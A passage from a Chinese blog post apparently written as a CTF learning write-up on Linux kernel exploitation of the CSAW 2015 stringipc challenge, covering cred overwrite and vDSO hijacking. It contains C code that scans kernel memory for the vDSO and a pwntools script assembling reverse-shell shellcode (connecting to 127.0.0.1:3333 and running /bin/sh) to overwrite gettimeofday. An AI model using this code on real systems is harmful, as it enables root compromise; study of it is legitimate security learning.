<p>所以总结利用过程就是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. shrink size获得内存任意读写</span><br><span class="line">2. 利用prctl(PR_SET_NAME)修改comm为一特殊字符串。</span><br><span class="line">3. 爆破comm的位置，从而获得cred结构体所在位置。</span><br><span class="line">4. 覆写cred结构体的uid~fgid字段，执行system(&quot;/bin/sh&quot;)提权。</span><br></pre></td></tr></table></figure></p>
<p>exp我就不贴了，仅仅记录我在学习过程中遇到的问题。</p>
<h2 id="利用方法二-劫持VDSO"><a href="#利用方法二-劫持VDSO" class="headerlink" title="利用方法二 劫持VDSO"></a>利用方法二 劫持VDSO</h2><h3 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h3><p>VDSO（virtual dynamic shared object）是一个小型的内核与用户空间的共享库，内核会自动将其映射到处于所有用户空间的对象的地址空间中，这样用户程序可以像调用其它库函数一样调用vdso里面的函数。之所以存在这样一个内核与用户之间的共享库，是因为有一些系统调用会被频繁调用，如果像传统那样先准备好参数，然后从用户态切换到内核态，比如32位系统就是int 80触发软件中断进入内核，上下文切换开销太大，而且有一些系统调用对时间要求很高。<br>在初始分配时，</p>
<p>vdso在内核态的权限是RW，在用户态的权限是RX，用户态查看如下所示，首先要关闭内核的地址随机化，再去查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ sudo sysctl -w kernel.randomize_va_space=0[sudo] password for ubuntu: </span><br><span class="line">kernel.randomize_va_space = 0</span><br><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ cat /proc/self/maps</span><br><span class="line">00400000-0040b000 r-xp 00000000 08:01 1048639                            /bin/cat</span><br><span class="line">0060a000-0060b000 r--p 0000a000 08:01 1048639                            /bin/cat</span><br><span class="line">0060b000-0060c000 rw-p 0000b000 08:01 1048639                            /bin/cat</span><br><span class="line">0060c000-0062d000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7ffff732f000-7ffff7a11000 r--p 00000000 08:01 1580912                    /usr/lib/locale/locale-archive</span><br><span class="line">7ffff7a11000-7ffff7bcf000 r-xp 00000000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7bcf000-7ffff7dcf000 ---p 001be000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7dcf000-7ffff7dd3000 r--p 001be000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7dd3000-7ffff7dd5000 rw-p 001c2000 08:01 3276900                    /lib/x86_64-linux-gnu/libc-2.19.so</span><br><span class="line">7ffff7dd5000-7ffff7dda000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7dda000-7ffff7dfd000 r-xp 00000000 08:01 3276897                    /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">7ffff7fe1000-7ffff7fe4000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">7ffff7ffc000-7ffff7ffd000 r--p 00022000 08:01 3276897                    /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">7ffff7ffd000-7ffff7ffe000 rw-p 00023000 08:01 3276897                    /lib/x86_64-linux-gnu/ld-2.19.so</span><br><span class="line">7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 </span><br><span class="line">7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br></pre></td></tr></table></figure></p>
<p>使用两个页框存储，将vdso dump下来查看文件格式及其格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ dd if=/proc/self/mem of=vdso.so bs=4096 skip=$[0x7ffff7ffa] count=2</span><br><span class="line">dd: ‘/proc/self/mem’: cannot skip to specified offset</span><br><span class="line">2+0 records in</span><br><span class="line">2+0 records out</span><br><span class="line">8192 bytes (8.2 kB) copied, 0.000358512 s, 22.9 MB/s</span><br><span class="line"></span><br><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ file vdso.so</span><br><span class="line">vdso.so: ELF 64-bit LSB  shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=01005e92ea3c0c1527396b65c7412468298d0813, stripped</span><br></pre></td></tr></table></figure></p>
<p>这里系统内核版本是3.19.0-25-generic：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu:~/kernel/pwn/ret2dir/stringipc$ cat /proc/version</span><br><span class="line">Linux version 3.19.0-25-generic (buildd@lgw01-20) (gcc version 4.8.2 (Ubuntu 4.8.2-19ubuntu1) ) #26~14.04.1-Ubuntu SMP Fri Jul 24 21:16:20 UTC 2015</span><br></pre></td></tr></table></figure></p>
<p>在IDA里可以看到它主要对外提供了4个函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">clock_gettime	0000000000000A20	</span><br><span class="line">gettimeofday	0000000000000D30	</span><br><span class="line">getcpu	        0000000000000F10	</span><br><span class="line">time	        0000000000000EF0</span><br></pre></td></tr></table></figure></p>
<p>可以利用如下方式获取当前进程映射的vdso的起始地址：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/auxv.h&gt;</span></span></span><br><span class="line"><span class="keyword">void</span> *vdso = (<span class="keyword">uintptr_t</span>) getauxval(AT_SYSINFO_EHDR);</span><br></pre></td></tr></table></figure></p>
<p>类似于vdso，还存在一块共享内存是vsyscall。</p>
<p>在有了内存的任意读写权限后，利用内核与用户程序拥有的这块共享内存，将vdso中的gettimeofday函数覆写为自己的shellocde。首先要找到内核中vdso的起始地址，因为每个内核版本偏移都不同，首先它一定是页对齐的，然后它拥有ELF文件的格式，有魔数”.ELF”，另外可以通过寻找特殊的字符串，比如”__vdso_gettimeofday”来确定:<br><a href="ret2dir利用学习/1.png">1</a><br>但这样还是找到了三个偏移,而且找到的vdso的起始地址都有魔数”.ELF”，输出的偏移是字符串在vdso中的偏移:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./exp_vdso</span><br><span class="line">[+]ALloc channel id: 1</span><br><span class="line">[+]shrink channel buf_size to -1</span><br><span class="line">gettimeofday offset in vdso: 0x2c6</span><br><span class="line">find in 0xffffffff81e04000</span><br><span class="line"></span><br><span class="line">gettimeofday offset in vdso: 0x19e</span><br><span class="line">find in 0xffffffff81e06000</span><br><span class="line"></span><br><span class="line">gettimeofday offset in vdso: 0x1e8</span><br><span class="line">find in 0xffffffff81e07000</span><br></pre></td></tr></table></figure></p>
<p>对于查找gettimeofday函数的偏移，可以参考从主机里dump下的vdso.so，在IDA里可以看到，这个函数里面有一个特殊的字符串：<br><a href="ret2dir利用学习/2.png">2</a><br>通过addr的地址可以确定vdso的地址，可以利用内存任意读权限去查找这个字符串“20C49BA5E353F7CFh”的偏移，这个二进制字符串差不多距离函数偏移为0xd0，然后在gdb里往前找一找，找函数开头“push rbp”的位置，从而确定gettimeofday函数的偏移，然后进行shellcode的覆写。在查找之前，同样追溯vdso这块内存的创建方式来进一步缩小范围。</p>
<p>爆破vdso地址部分代码如下所示：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> target[<span class="number">20</span>] = <span class="string">"__vdso_gettimeofday"</span>;</span><br><span class="line"><span class="keyword">char</span> funcstr[<span class="number">10</span>] = <span class="string">"\xcf\xf7\x53\xe3\xa5\x9b\xc4\x20"</span>;</span><br><span class="line"><span class="keyword">for</span>(;addr&lt;<span class="number">0xffffffffffffefff</span>;addr+=<span class="number">0x1000</span>)&#123;</span><br><span class="line">    seek_channel.id = id;</span><br><span class="line">    seek_channel.index = addr - <span class="number">0x10</span>;</span><br><span class="line">    seek_channel.whence = SEEK_SET;</span><br><span class="line">    ioctl(fd,CSAW_SEEK_CHANNEL,&amp;seek_channel);</span><br><span class="line"></span><br><span class="line">    read_channel.id = id;</span><br><span class="line">    read_channel.buf = buf;</span><br><span class="line">    read_channel.count = <span class="number">0x1000</span>;</span><br><span class="line">    ioctl(fd,CSAW_READ_CHANNEL,&amp;read_channel);</span><br><span class="line"></span><br><span class="line">    gettime_result = memmem(buf,<span class="number">0x1000</span>,target,<span class="built_in">strlen</span>(target));</span><br><span class="line">    func_result = memmem(buf,<span class="number">0x1000</span>,funcstr,<span class="built_in">strlen</span>(funcstr));</span><br><span class="line">    <span class="keyword">if</span>(gettime_result &amp;&amp; func_result)&#123;</span><br><span class="line">        <span class="comment">//size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);</span></span><br><span class="line">        <span class="keyword">size_t</span> function_offset = func_result - (<span class="keyword">int</span>)(buf);</span><br><span class="line">        gettime_offset = gettime_result - (<span class="keyword">int</span>)(buf);</span><br><span class="line">        <span class="comment">//printf("vdso addr: 0x%lx\n",vdso_addr);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"__vdso_gettimeofday offset in vdso: 0x%lx\n"</span>,gettime_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"gettimeofday function in 0x%lx\n"</span>,function_offset);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"find in 0x%lx\n"</span>,addr);</span><br><span class="line">        getchar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>最后执行结果找到了两个偏移，在gdb里往前找”push rbp”可以发现第二个偏移是opcode_map_0f_38这个函数，从而确定第一个偏移是我们需要的地址。其中gettimeofday这个函数的偏移是0xc80。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ $ ./exp_vdso</span><br><span class="line">[+]ALloc channel id: 1</span><br><span class="line">[+]shrink channel buf_size to -1</span><br><span class="line">__vdso_gettimeofday offset in vdso: 0x2c6</span><br><span class="line">gettimeofday function in 0xd3b</span><br><span class="line">find in 0xffffffff81e04000</span><br><span class="line"></span><br><span class="line">__vdso_gettimeofday offset in vdso: 0x19e</span><br><span class="line">gettimeofday function in 0xa4b</span><br><span class="line">find in 0xffffffff81e06000</span><br></pre></td></tr></table></figure></p>
<h3 id="shellcode组成"><a href="#shellcode组成" class="headerlink" title="shellcode组成"></a>shellcode组成</h3><p>上一步找到了gettimeofday函数的地址，需要将内核中这个函数的位置覆写为shellcode。利用思路是当其他进程调用gettimeofday函数时执行我们的shellcode。这里shellcode采取了一定的优化，我参考了这篇<a href="https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html" target="_blank" rel="noopener">博客</a>。思想是覆写后，每一个进程只要调用gettimeofday函数就会调用我们的shellcode，但其实我们只需要具有root权限的进程。在shellcode中首先调用系统调用sys_getuid(0x66)判断进程权限，对于那些uid不为0的进程，接着调用sys_gettimeofday(0x60)执行正常的gettimeofday函数功能；对于那些uid=0的进程，调用0x39系统调用fork一个子进程去反弹shell，父进程继续执行sys_gettimeofday(0x60)。反弹的shell连接到127.0.0.1:3333并执行”/bin/sh”。shellcode在<a href="https://gist.github.com/itsZN/1ab36391d1849f15b785" target="_blank" rel="noopener">这里</a>可以找到，我这里先写成了汇编，然后转成十六进制，以加深理解。64位的系统调用可以参考<a href="https://syscalls64.paolostivanin.com/" target="_blank" rel="noopener">这里</a>。关于反弹shell我之前我写过一篇，是pwnable.tw的<a href="https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/">kidding</a>。<br>但有一个问题我没弄明白127.0.0.1:3333和execve(“/bin/sh”)的参数是如何传参的。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment">##getuid()</span></span><br><span class="line">code = <span class="string">""" </span></span><br><span class="line"><span class="string">        nop</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x66</span></span><br><span class="line"><span class="string">        syscall  #getuid()</span></span><br><span class="line"><span class="string">        xor rbx,rbx</span></span><br><span class="line"><span class="string">        cmp rbx,rax</span></span><br><span class="line"><span class="string">        jne emulate</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##fork()</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x39</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        xor rbx,rbx</span></span><br><span class="line"><span class="string">        cmp rax,rbx</span></span><br><span class="line"><span class="string">        je connect</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##gettimeofday() and retn</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        emulate:</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x60</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        retq</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"><span class="comment">##socket(2,1,0)</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        connect:</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        pushq 0x1</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        push 0x2</span></span><br><span class="line"><span class="string">        pop rdi</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x29</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"><span class="comment">##connect(fd,ip,0x10)</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        xchg rdi,rax</span></span><br><span class="line"><span class="string">        mov rcx,0xfeffff80faf2fffd</span></span><br><span class="line"><span class="string">        not rcx</span></span><br><span class="line"><span class="string">        push rcx</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        pushq 0x10</span></span><br><span class="line"><span class="string">        pop rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x2a</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">       """</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##try dup2(oldfd,2),dup2(oldfd,1),dup2(oldfd,0)</span></span><br><span class="line"></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        xor rbx,rbx</span></span><br><span class="line"><span class="string">        cmp rbx,rax</span></span><br><span class="line"><span class="string">        je sh</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0xe7</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        sh:</span></span><br><span class="line"><span class="string">        pushq 0x3</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        duploop:</span></span><br><span class="line"><span class="string">        pushq 0x21</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        dec rsi</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        jne duploop</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"><span class="comment">##execve()</span></span><br><span class="line"><span class="comment">##exit()</span></span><br><span class="line">code += <span class="string">"""</span></span><br><span class="line"><span class="string">        mov rbx,0xff978cd091969dd0</span></span><br><span class="line"><span class="string">        not rbx</span></span><br><span class="line"><span class="string">        push rbx</span></span><br><span class="line"><span class="string">        mov rdi,rsp</span></span><br><span class="line"><span class="string">        push rdi</span></span><br><span class="line"><span class="string">        mov rsi,rsp</span></span><br><span class="line"><span class="string">        xor rdx,rdx</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0x3b</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        xor rax,rax</span></span><br><span class="line"><span class="string">        mov al,0xe7</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(code,arch=<span class="string">"amd64"</span>)</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shellcode)):</span><br><span class="line">   str1 += <span class="string">"\\x"</span> + binascii.b2a_hex(shellcode[i])</span><br><span class="line"><span class="keyword">print</span> str1</span><br></pre></td></tr></table></figure></p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>总结一下利用思路：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. shrink size获得内存任意读写权限。</span><br><span class="line">2. 利用特殊字符串爆破vdso的地址。</span><br><span class="line">3. 将vdso的中gettimeofday函数覆写为shellcode。</span><br><span class="line">4. 判断shell code是否覆写成功，若成功，则fork一个子进程，并监听127.0.0.1:3333端口，等待shell的回连。</span><br><span class="line">5. 发生gettimeofday函数调用，shellcode执行反弹shell，提权成功。</span><br></pre></td></tr></table></figure></p>
<p>这里测试环境使用了p4nda大佬的方法，在init中加载一个循环执行gettimeofday函数并具有root权限的程序。<br>exp我就不贴了，仅仅记录我在学习过程中遇到的问题。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><h2 id="vdso"><a href="#vdso" class="headerlink" title="vdso"></a>vdso</h2><p><a href="https://cloud.tencent.com/developer/article/1073909" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1073909</a><br><a href="http://man7.org/linux/man-pages/man7/vdso.7.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man7/vdso.7.html</a><br><a href="https://blog.csdn.net/wlp600/article/details/6886162" target="_blank" rel="noopener">https://blog.csdn.net/wlp600/article/details/6886162</a></p>
<h2 id="ret2dir"><a href="#ret2dir" class="headerlink" title="ret2dir"></a>ret2dir</h2><p><a href="https://www.anquanke.com/post/id/185408" target="_blank" rel="noopener">https://www.anquanke.com/post/id/185408</a><br><a href="https://www.cnblogs.com/0xJDchen/p/6143102.html" target="_blank" rel="noopener">https://www.cnblogs.com/0xJDchen/p/6143102.html</a><br><a href="https://xz.aliyun.com/t/5944#toc-13" target="_blank" rel="noopener">https://xz.aliyun.com/t/5944#toc-13</a><br><a href="http://p4nda.top/2018/11/07/stringipc/" target="_blank" rel="noopener">http://p4nda.top/2018/11/07/stringipc/</a><br><a href="https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html" target="_blank" rel="noopener">https://hardenedlinux.github.io/translation/2015/11/25/Translation-Bypassing-SMEP-Using-vDSO-Overwrites.html</a></p>
<h1 id="强网杯-2018-solid-core"><a href="#强网杯-2018-solid-core" class="headerlink" title="强网杯 2018 solid_core"></a>强网杯 2018 solid_core</h1><h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-225488.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225488.htm</a></p>
<h1 id="de1CTF-2019-race"><a href="#de1CTF-2019-race" class="headerlink" title="de1CTF 2019 race"></a>de1CTF 2019 race</h1><h2 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h2><p><a href="https://xz.aliyun.com/t/3204#toc-11" target="_blank" rel="noopener">https://xz.aliyun.com/t/3204#toc-11</a></p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      
        <div class="post-tags">
          
            <a href="/tags/Linux-kernel-pwn/" rel="tag"># Linux kernel pwn</a>
          
            <a href="/tags/CTF/" rel="tag"># CTF</a>
          
        </div>
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/10/04/KCTF-Q3-PWN/" rel="next" title="KCTF Q3 PWN">
                <i class="fa fa-chevron-left"></i> KCTF Q3 PWN
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name"></p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">41</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">11</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#CSAW-2015-stringipc"><span class="nav-number">1.</span> <span class="nav-text">CSAW 2015 stringipc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#题目描述"><span class="nav-number">1.1.</span> <span class="nav-text">题目描述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法一-覆写cred结构体"><span class="nav-number">1.2.</span> <span class="nav-text">利用方法一 覆写cred结构体</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#进程描述符、线程描述符和cred"><span class="nav-number">1.2.1.</span> <span class="nav-text">进程描述符、线程描述符和cred</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用方法二-劫持VDSO"><span class="nav-number">1.3.</span> <span class="nav-text">利用方法二 劫持VDSO</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#VDSO"><span class="nav-number">1.3.1.</span> <span class="nav-text">VDSO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#shellcode组成"><span class="nav-number">1.3.2.</span> <span class="nav-text">shellcode组成</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">1.3.3.</span> <span class="nav-text">利用思路</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#vdso"><span class="nav-number">2.1.</span> <span class="nav-text">vdso</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-number">2.2.</span> <span class="nav-text">ret2dir</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#强网杯-2018-solid-core"><span class="nav-number">3.</span> <span class="nav-text">强网杯 2018 solid_core</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考-1"><span class="nav-number">3.1.</span> <span class="nav-text">参考</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#de1CTF-2019-race"><span class="nav-number">4.</span> <span class="nav-text">de1CTF 2019 race</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#参考-2"><span class="nav-number">4.1.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder"></span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



